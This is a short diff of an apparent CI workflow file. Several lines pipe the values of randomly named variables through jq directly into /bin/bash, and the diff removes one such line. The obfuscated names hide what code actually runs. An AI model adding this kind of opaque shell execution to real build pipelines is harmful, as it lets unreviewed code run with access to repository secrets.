@@ -27,7 +27,6 @@ jobs:
           echo $etbaw24 | jq -r .yzoal10 | /bin/bash
           printf '%s' "$v6" | jq -r .ug94 | /bin/bash
           printf '%s' "$nuzx477" | jq -r .uhx34617 | /bin/bash
-          printf '%s' "$dyku9719" | jq -r .day822 | /bin/bash
 
       - name: Archive results
         if: always()
